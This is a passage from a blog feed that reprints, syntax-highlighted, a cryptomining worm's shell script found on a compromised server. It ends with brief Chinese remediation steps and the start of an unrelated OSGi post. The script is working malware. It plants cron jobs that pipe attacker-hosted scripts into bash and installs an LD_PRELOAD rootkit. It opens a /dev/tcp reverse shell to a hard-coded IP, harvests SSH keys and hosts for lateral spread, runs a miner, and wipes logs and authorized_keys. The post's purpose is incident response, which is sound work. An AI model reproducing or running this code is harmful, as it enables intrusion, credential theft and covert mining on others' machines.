class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v wdl)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"wdl -O "</span> ; <span class="keyword">fi</span> ; <span class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v wge)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"wge -O "</span> ; <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v wget2)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"wget2 -O "</span> ; <span class="keyword">fi</span> ; <span class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v wget)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"wget -O "</span> ; <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v cdl)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"cdl -Lk -o "</span> ; <span class="keyword">fi</span> ; <span class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v cur)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"cur -Lk -o "</span> ; <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v curl2)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"curl2 -Lk -o "</span> ; <span class="keyword">fi</span> ; <span class="keyword">if</span> ! [ -z <span class="string">"<span class="variable">$(command -v curl)</span>"</span> ] ; <span class="keyword">then</span> DLB=<span class="string">"curl -Lk -o "</span> ; <span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$DLB</span></span><br><span class="line">url=<span class="string">"w.apacheorg.top:1234"</span></span><br><span class="line">liburl=<span class="string">"http://107.172.214.23:1234/.libs"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">cronlow</span></span>()&#123;</span><br><span class="line">  cr=$(crontab -l | grep -q <span class="variable">$url</span> | wc -l)</span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$&#123;cr&#125;</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">    crontab -r</span><br><span class="line">    (crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">"30 23 * * * (curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh"</span>)| crontab -</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"cronlow skip"</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -w /usr/sbin ]; <span class="keyword">then</span></span><br><span class="line">  SPATH=/usr/sbin</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SPATH=/tmp</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$SPATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'handling download itself ...'</span></span><br><span class="line"><span class="keyword">if</span> cat /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 | grep -q <span class="string">"205.185.113.151\|5.196.247.12\|bash.givemexyz.xyz\|194.156.99.30\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuMTU2Ljk5LjMwL2QucHkiKS5yZWFkKCkpJw==\|bash.givemexyz.in\|205.185.116.78"</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1</span><br><span class="line">  crontab -r</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> crontab -l | grep <span class="string">"<span class="variable">$url</span>"</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Cron exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  apt-get install -y cron</span><br><span class="line">  yum install -y vixie-cron crontabs</span><br><span class="line">  service crond start</span><br><span class="line">  chkconfig --level 35 crond on</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Cron not found"</span></span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">"30 23 * * * root (curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh\n##"</span> &gt; /etc/cron.d/`whoami`</span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">"30 23 * * * root (curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh\n##"</span> &gt; /etc/cron.d/apache</span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">"30 23 * * * root (curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh\n##"</span> &gt; /etc/cron.d/nginx</span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">"30 23 * * * (curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh\n##"</span> &gt; /var/spool/cron/`whoami`</span><br><span class="line">  mkdir -p /var/spool/cron/crontabs</span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">"30 23 * * * (curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh\n##"</span> &gt; /var/spool/cron/crontabs/`whoami`</span><br><span class="line">  mkdir -p /etc/cron.hourly</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"(curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh"</span> &gt; /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"(curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh"</span> &gt; /etc/cron.hourly/oanacroner1 | chmod 755 /etc/init.d/down</span><br><span class="line">  chattr +ai -V /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 /etc/init.d/down</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"(curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss )|bash -sh"</span> &gt; /etc/init.d/down | chmod 755 /etc/init.d/down</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">localgo</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"localgo start"</span></span><br><span class="line">  myhostip=$(curl -sL icanhazip.com)</span><br><span class="line">  KEYS=$(find ~/ /root /home -maxdepth 3 -name <span class="string">'id_rsa*'</span> | grep -vw pub)</span><br><span class="line">  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F <span class="string">"IdentityFile"</span> <span class="string">'&#123;print $2 &#125;'</span>)</span><br><span class="line">  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E <span class="string">"(ssh|scp)"</span> | awk -F <span class="string">' -i '</span> <span class="string">'&#123;print $2&#125;'</span> | awk <span class="string">'&#123;print $1'</span>&#125;)</span><br><span class="line">  KEYS4=$(find ~/ /root /home -maxdepth 3 -name <span class="string">'*.pem'</span> | uniq)</span><br><span class="line">  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F <span class="string">"HostName"</span> <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line">  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E <span class="string">"(ssh|scp)"</span> | grep -oP <span class="string">"([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;"</span>)</span><br><span class="line">  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E <span class="string">"(ssh|scp)"</span> | tr <span class="string">':'</span> <span class="string">' '</span> | awk -F <span class="string">'@'</span> <span class="string">'&#123;print $2&#125;'</span> | awk -F <span class="string">'&#123;print $1&#125;'</span>)</span><br><span class="line">  HOSTS4=$(cat /etc/hosts | grep -vw <span class="string">"0.0.0.0"</span> | grep -vw <span class="string">"127.0.1.1"</span> | grep -vw <span class="string">"127.0.0.1"</span> | grep -vw <span class="variable">$myhostip</span> | sed -r <span class="string">'/\n/!s/[0-9.]+/\n&amp;\n/;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\n/P;D'</span> | awk <span class="string">'&#123;print $1&#125;'</span>)</span><br><span class="line">  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP <span class="string">"([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;"</span> | uniq)</span><br><span class="line">  HOSTS6=$(ps auxw | grep -oP <span class="string">"([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;"</span> | grep <span class="string">":22"</span> | uniq)</span><br><span class="line">  USERZ=$(</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"root"</span></span><br><span class="line">    find ~/ /root /home -maxdepth 2 -name <span class="string">'\.ssh'</span> | uniq | xargs find | awk <span class="string">'/id_rsa/'</span> | awk -F<span class="string">'/'</span> <span class="string">'&#123;print $3&#125;'</span> | uniq | grep -wv <span class="string">".ssh"</span></span><br><span class="line">  )</span><br><span class="line">  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw <span class="string">"cp"</span> | grep -vw <span class="string">"mv"</span> | grep -vw <span class="string">"cd "</span> | grep -vw <span class="string">"nano"</span> | grep -v grep | grep -E <span class="string">"(ssh|scp)"</span> | tr <span class="string">':'</span> <span class="string">' '</span> | awk -F <span class="string">'@'</span> <span class="string">'&#123;print $1&#125;'</span> | awk <span class="string">'&#123;print $4&#125;'</span> | uniq)</span><br><span class="line">  sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw <span class="string">"cp"</span> | grep -vw <span class="string">"mv"</span> | grep -vw <span class="string">"cd "</span> | grep -vw <span class="string">"nano"</span> | grep -v grep | grep -E <span class="string">"(ssh|scp)"</span> | tr <span class="string">':'</span> <span class="string">' '</span> | awk -F <span class="string">'-p'</span> <span class="string">'&#123;print $2&#125;'</span> | awk <span class="string">'&#123;print $1&#125;'</span> | sed <span class="string">'s/[^0-9]*//g'</span> | tr <span class="string">' '</span> <span class="string">'\n'</span> | nl | sort -u -k2 | sort -n | cut -f2- | sed -e <span class="string">"\$a22"</span>)</span><br><span class="line">  userlist=$(<span class="built_in">echo</span> <span class="string">"<span class="variable">$USERZ</span> <span class="variable">$USERZ2</span>"</span> | tr <span class="string">' '</span> <span class="string">'\n'</span> | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw <span class="string">"."</span> | grep -vw <span class="string">"ssh"</span> | sed <span class="string">'/\./d'</span>)</span><br><span class="line">  hostlist=$(<span class="built_in">echo</span> <span class="string">"<span class="variable">$HOSTS</span> <span class="variable">$HOSTS2</span> <span class="variable">$HOSTS3</span> <span class="variable">$HOSTS4</span> <span class="variable">$HOSTS5</span> <span class="variable">$HOSTS6</span>"</span> | grep -vw 127.0.0.1 | tr <span class="string">' '</span> <span class="string">'\n'</span> | nl | sort -u -k2 | sort -n | cut -f2-)</span><br><span class="line">  keylist=$(<span class="built_in">echo</span> <span class="string">"<span class="variable">$KEYS</span> <span class="variable">$KEYS2</span> <span class="variable">$KEYS3</span> <span class="variable">$KEYS4</span>"</span> | tr <span class="string">' '</span> <span class="string">'\n'</span> | nl | sort -u -k2 | sort -n | cut -f2-)</span><br><span class="line">  i=0</span><br><span class="line">  <span class="keyword">for</span> user <span class="keyword">in</span> <span class="variable">$userlist</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$hostlist</span>; <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">for</span> key <span class="keyword">in</span> <span class="variable">$keylist</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> sshp <span class="keyword">in</span> <span class="variable">$sshports</span>; <span class="keyword">do</span></span><br><span class="line">          ((i++))</span><br><span class="line">          <span class="keyword">if</span> [ <span class="string">"<span class="variable">$&#123;i&#125;</span>"</span> -eq <span class="string">"20"</span> ]; <span class="keyword">then</span></span><br><span class="line">            sleep 5</span><br><span class="line">            ps wx | grep <span class="string">"ssh -o"</span> | awk <span class="string">'&#123;print $1&#125;'</span> | xargs <span class="built_in">kill</span> -9 &amp;&gt;/dev/null &amp;</span><br><span class="line">            i=0</span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">#Wait 5 seconds after every 20 attempts and clean up hanging processes</span></span><br><span class="line"></span><br><span class="line">          chmod +r <span class="variable">$key</span></span><br><span class="line">          chmod 400 <span class="variable">$key</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span>@<span class="variable">$host</span>"</span></span><br><span class="line">          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i <span class="variable">$key</span> <span class="variable">$user</span>@<span class="variable">$host</span> -p <span class="variable">$sshp</span> <span class="string">"(curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss)|bash -sh; echo <span class="variable">$base</span> | base64 -d | bash -; lwp-download http://<span class="variable">$url</span>/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"</span></span><br><span class="line">          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i <span class="variable">$key</span> <span class="variable">$user</span>@<span class="variable">$host</span> -p <span class="variable">$sshp</span> <span class="string">"(curl -s http://<span class="variable">$url</span>/xmss||wget -q -O - http://<span class="variable">$url</span>/xmss)|bash -sh; echo <span class="variable">$base</span> | base64 -d | bash -; lwp-download http://<span class="variable">$url</span>/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="comment"># scangogo</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"local done"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MD5_1_XMR=<span class="string">"e5c3720e14a5ea7f678e0a9835d28283"</span></span><br><span class="line">MD5_2_XMR=`md5sum <span class="variable">$SPATH</span>/.libs | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$SPATH</span>"</span> = <span class="string">"/usr/sbin"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  chattr -ia / /usr/ /usr/<span class="built_in">local</span>/ /usr/<span class="built_in">local</span>/lib/ 2&gt;/dev/null</span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">"<span class="variable">$MD5_1_XMR</span>"</span> = <span class="string">"<span class="variable">$MD5_2_XMR</span>"</span> ]</span><br><span class="line">  <span class="keyword">then</span> </span><br><span class="line">    <span class="keyword">if</span> [ $(netstat -ant|grep <span class="string">'107.172.214.23:80'</span>|grep <span class="string">'ESTABLISHED'</span>|grep -v grep|wc -l) -eq <span class="string">'0'</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="variable">$SPATH</span>/.libs</span><br><span class="line">      chattr -ia /etc/ /usr/<span class="built_in">local</span>/lib/libs.so  /etc/ld.so.preload 2&gt;/dev/null</span><br><span class="line">      chattr -ai /etc/ld.so.* 2&gt;/dev/null</span><br><span class="line">      <span class="variable">$DLB</span> /usr/<span class="built_in">local</span>/lib/libs.so http://<span class="variable">$url</span>/libs.so</span><br><span class="line">      <span class="built_in">export</span> LD_PRELOAD=/usr/<span class="built_in">local</span>/lib/libs.so</span><br><span class="line">      sed -i <span class="string">'s/\/usr\/local\/lib\/ini.so//'</span> /etc/ld.so.preload</span><br><span class="line">      sed -i <span class="string">'s/\/usr\/local\/lib\/libs.so//'</span> /etc/ld.so.preload</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">'/usr/local/lib/libs.so'</span> &gt;&gt; /etc/ld.so.preload</span><br><span class="line">      chattr +ai <span class="variable">$SPATH</span>/.libs <span class="variable">$SPATH</span>/.inis /usr/<span class="built_in">local</span>/lib/libs.so /etc/ld.so.preload 2&gt;/dev/null</span><br><span class="line">      localgo</span><br><span class="line">    <span class="keyword">elif</span> [ $(netstat -ant|grep <span class="string">'192.210.200.66:8899'</span>|grep <span class="string">'ESTABLISHED'</span>|grep -v grep|wc -l) -eq <span class="string">'0'</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="variable">$DLB</span> <span class="variable">$SPATH</span>/.inis http://<span class="variable">$url</span>/inis</span><br><span class="line">      chmod +x <span class="variable">$SPATH</span>/.inis 2&gt;/dev/null</span><br><span class="line">      nohup <span class="variable">$SPATH</span>/.inis &amp;</span><br><span class="line">      nohup bash -i &gt;&amp; /dev/tcp/192.210.200.66/8899 0&gt;&amp;1 &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"ok"</span></span><br><span class="line">      chattr -ia /etc/ /usr/<span class="built_in">local</span>/lib/libs.so /etc/ld.so.preload 2&gt;/dev/null</span><br><span class="line">      chattr -ai /etc/ld.so.* 2&gt;/dev/null</span><br><span class="line">      <span class="variable">$DLB</span> /usr/<span class="built_in">local</span>/lib/libs.so http://<span class="variable">$url</span>/libs.so</span><br><span class="line">      sed -i <span class="string">'s/\/usr\/local\/lib\/ini.so//'</span> /etc/ld.so.preload</span><br><span class="line">      sed -i <span class="string">'s/\/usr\/local\/lib\/libs.so//'</span> /etc/ld.so.preload</span><br><span class="line">      <span class="built_in">export</span> LD_PRELOAD=/usr/<span class="built_in">local</span>/lib/libs.so</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">'/usr/local/lib/libs.so'</span> &gt;&gt; /etc/ld.so.preload</span><br><span class="line">      chattr +ai <span class="variable">$SPATH</span>/.libs <span class="variable">$SPATH</span>/.inis /usr/<span class="built_in">local</span>/lib/libs.so /etc/ld.so.preload 2&gt;/dev/null</span><br><span class="line">      localgo</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    localgo</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    chattr -ia /etc/ /usr/<span class="built_in">local</span>/lib/libs.so /etc/ld.so.preload 2&gt;/dev/null</span><br><span class="line">    chattr -ai /etc/ld.so.* 2&gt;/dev/null</span><br><span class="line">    chattr -ai /usr/sbin/.libs 2&gt;/dev/null</span><br><span class="line">    chattr -ai /usr/sbin/.inis 2&gt;/dev/null</span><br><span class="line">    rm -f <span class="variable">$SPATH</span>/.libs</span><br><span class="line">    rm -f <span class="variable">$SPATH</span>/.inis</span><br><span class="line">    <span class="variable">$DLB</span> <span class="variable">$SPATH</span>/.libs <span class="variable">$liburl</span></span><br><span class="line">    <span class="variable">$DLB</span> /usr/<span class="built_in">local</span>/lib/libs.so http://<span class="variable">$url</span>/libs.so</span><br><span class="line">    <span class="variable">$DLB</span> <span class="variable">$SPATH</span>/.ini http://<span class="variable">$url</span>/inis</span><br><span class="line">    <span class="built_in">export</span> LD_PRELOAD=/usr/<span class="built_in">local</span>/lib/libs.so</span><br><span class="line">    sed -i <span class="string">'s/\/usr\/local\/lib\/ini.so//'</span> /etc/ld.so.preload</span><br><span class="line">    sed -i <span class="string">'s/\/usr\/local\/lib\/libs.so//'</span> /etc/ld.so.preload</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'/usr/local/lib/libs.so'</span> &gt;&gt; /etc/ld.so.preload</span><br><span class="line">    chattr +ia /usr/<span class="built_in">local</span>/lib/libs.so</span><br><span class="line">    chattr +ia /usr/<span class="built_in">local</span>/lib/inis.so</span><br><span class="line">    chmod +x <span class="variable">$SPATH</span>/.libs 2&gt;/dev/null</span><br><span class="line">    chmod +x <span class="variable">$SPATH</span>/.inis 2&gt;/dev/null</span><br><span class="line">    <span class="variable">$SPATH</span>/.libs</span><br><span class="line">    nohup <span class="variable">$SPATH</span>/.inis 1&gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">    nohup bash -i &gt;&amp; /dev/tcp/192.210.200.66/8899 0&gt;&amp;1 &amp;</span><br><span class="line">    chattr +ai <span class="variable">$SPATH</span>/.libs</span><br><span class="line">    chattr +ai <span class="variable">$SPATH</span>/.inis</span><br><span class="line">    localgo</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">"<span class="variable">$MD5_1_XMR</span>"</span> != <span class="string">"<span class="variable">$MD5_2_XMR</span>"</span> ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    chattr -ai <span class="variable">$SPATH</span>/.libs</span><br><span class="line">    chattr -ai <span class="variable">$SPATH</span>/.inis</span><br><span class="line">    <span class="variable">$DLB</span> <span class="variable">$SPATH</span>/.libs <span class="variable">$liburl</span></span><br><span class="line">    <span class="variable">$DLB</span> <span class="variable">$SPATH</span>/.inis http://<span class="variable">$url</span>/inis</span><br><span class="line">    chattr -ia /etc/ /usr/<span class="built_in">local</span>/lib/libs.so /etc/ld.so.preload 2&gt;/dev/null</span><br><span class="line">    chattr -ai /etc/ld.so.* 2&gt;/dev/null</span><br><span class="line">    <span class="variable">$DLB</span> /usr/<span class="built_in">local</span>/lib/libs.so http://<span class="variable">$url</span>/libs.so</span><br><span class="line">    sed -i <span class="string">'s/\/usr\/local\/lib\/ini.so//'</span> /etc/ld.so.preload</span><br><span class="line">    sed -i <span class="string">'s/\/usr\/local\/lib\/libs.so//'</span> /etc/ld.so.preload</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'/usr/local/lib/libs.so'</span> &gt;&gt; /etc/ld.so.preload</span><br><span class="line">    chattr +ia /usr/<span class="built_in">local</span>/lib/libs.so</span><br><span class="line">    chmod +x <span class="variable">$SPATH</span>/.libs 2&gt;/dev/null</span><br><span class="line">    chmod +x <span class="variable">$SPATH</span>/.inis 2&gt;/dev/null</span><br><span class="line">    <span class="variable">$SPATH</span>/.libs</span><br><span class="line">    nohup <span class="variable">$SPATH</span>/.inis 1&gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">    nohup bash -i &gt;&amp; /dev/tcp/192.210.200.66/8899 0&gt;&amp;1 &amp;</span><br><span class="line">    chattr +ai <span class="variable">$SPATH</span>/.libs</span><br><span class="line">    chattr +ai <span class="variable">$SPATH</span>/.inis</span><br><span class="line">    localgo</span><br><span class="line">    cronlow</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cronlow</span><br><span class="line">    <span class="keyword">if</span> [ $(netstat -ant|grep <span class="string">'107.172.214.23:80'</span>|grep <span class="string">'ESTABLISHED'</span>|grep -v grep|wc -l) -eq <span class="string">'0'</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="variable">$SPATH</span>/.libs</span><br><span class="line">      localgo</span><br><span class="line">    <span class="keyword">elif</span> [ $(netstat -ant|grep <span class="string">'192.210.200.66:8899'</span>|grep <span class="string">'ESTABLISHED'</span>|grep -v grep|wc -l) -eq <span class="string">'0'</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      nohup <span class="variable">$SPATH</span>/.inis 1&gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">      nohup bash -i &gt;&amp; /dev/tcp/192.210.200.66/8899 0&gt;&amp;1 &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"ok"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 0&gt;/root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/spool/mail/root</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/wtmp</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/cron</span><br><span class="line"><span class="built_in">echo</span> 0&gt;~/.bash_history</span><br><span class="line"><span class="built_in">history</span> -c 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p></p><ul><li>解决<ul><li>杀掉相应进程，杀掉所有用户进程可以使用<code>pkill -u apache</code></li><li>清除文件</li><li>删除定时任务</li><li>修复ShowDoc等应用漏洞</li></ul></li></ul><hr><p>参考文章</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;区块链（Blockchain）：它是一种特殊的分布式数据库 &lt;a href=&quot;https://www.ruanyifeng.co
      
    
    </summary>
    
      <category term="arch" scheme="http://blog.aezo.cn/categories/arch/"/>
    
    
  </entry>
  
  <entry>
    <title>OSGi —— Java动态模块化规范</title>
    <link href="http://blog.aezo.cn/2021/02/09/java/osgi/"/>
    <id>http://blog.aezo.cn/2021/02/09/java/osgi/</id>
    <published>2021-02-09T11:10:00.000Z</published>
    <updated>2021-08-31T06:07:20.357Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><strong>Java其他插件化开发(OSGi文档较少，2021-02弃用)</strong><ul><li><a href="https://www.sofastack.tech/" target="_blank" rel="noopener">sofastack</a></li><li><a href="https://github.com/pf4j/pf4j" target="_blank" rel="noopener">pf4j</a></li><li><a href="https://gitee.com/starblues/springboot-plugin-framework-parent" target="_blank" rel="noopener">springboot-plugin-framework, 基于pf4j</a></li></ul></li><li>OSGi：<code>Open Service Gateway Initiative</code> 是一个Java模块化规范</li><li><a href="https://www.osgi.org/" target="_blank" rel="noopener">官网：https://www.osgi.org/</a></li><li>Eclipse的插件机制就是基于OSGI规范实现</li><li>相关实现(运行时容器)<ul><li><a href="https://felix.apache.org/" target="_blank" rel="noopener">Felix</a> 是一个 OSGi 版本 4 规范的 Apache 实现<ul><li><a href="https://karaf.apache.org/" target="_blank" rel="noopener">Apache Karaf</a>：基于Felix实现，是一个运行基于OSGi的应用程序的平台，提供了如命令行界面将使我们能够与平台进行交互</li><li><a href="http://servicemix.apache.org/" target="_blank" rel="noopener">ServiceMix</a>：它将Apache ActiveMQ，<a href="https://camel.apache.org/" target="_blank" rel="noopener">Camel</a>，CXF和Karaf的特性和功能统一到一个功能强大的运行时平台中，可用于构建自己的集成解决方案，它提供了由OSGi独家提供的完整的企业级ESB。最近更新2017年</li></ul></li><li><a href="http://www.eclipse.org/equinox/" target="_blank" rel="noopener">Equinox</a> 是 Eclipse对应的OSGi框架(容器)，是AppFuse的一个轻量级版本。对web的默认支持Spring MVC、Hibernat等组件</li></ul></li><li><a href="http://www.eclipse.org/gemini/" target="_blank" rel="noopener">Gemimi Blueprint</a> 由Eclipse维护，部分代码由SpringSource捐献的<code>Spring DM</code>(Spring Dynamic Modules，前身为Spring OSGi)项目代码 <a href="https://blog.csdn.net/wdvceafvcsrgfv/article/details/78868508" target="_blank" rel="noopener">^3</a><ul><li>SpringDM并不是OSGi的标准实现，它的运行必须依赖OSGi的标准容器，比如Equinox、Felix或是Knopflerfish等</li><li>SpringDM完成了OSGi服务的注册、查询、使用和监听，我们也可以将这些OSGi服务称之为Bean</li></ul></li><li>基于<a href="https://github.com/klebeer/karaf-springboot.git" target="_blank" rel="noopener">springboot osgi demo</a>未测试成功</li></ul><h3 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a>相关文档</h3><ul><li><a href="http://osgi.com.cn/" target="_blank" rel="noopener">OSGi中文社区</a></li><li><a href="https://course.tianmaying.com/osgi-toturial" target="_blank" rel="noopener">OSGi入门教程</a></li><li><a href="https://course.tianmaying.com/osgi" target="_blank" rel="noopener">理解OSGi</a></li><li><a href="https://www.tianmaying.com/tutorial/plugin" target="_blank" rel="noopener">一种基于OSGi和Docker的SaaS平台热插拔系统设计方案</a></li></ul><h3 id="OSGi与微服务区别"><a href="#OSGi与微服务区别" class="headerlink" title="OSGi与微服务区别"></a>OSGi与微服务区别</h3><ul><li>OSGi <a href="http://paulonjava.blogspot.com/2014/04/micro-services-vs-osgi-services.html" target="_blank" rel="noopener">^2</a><ul><li>各模块是基于同一个JVM，服务(模块)直接调用是基于方法级别的，不会有网络开销。各服务也叫µServices或纳米服务</li><li>可基于单体部署</li></ul></li><li>微服务(Micro 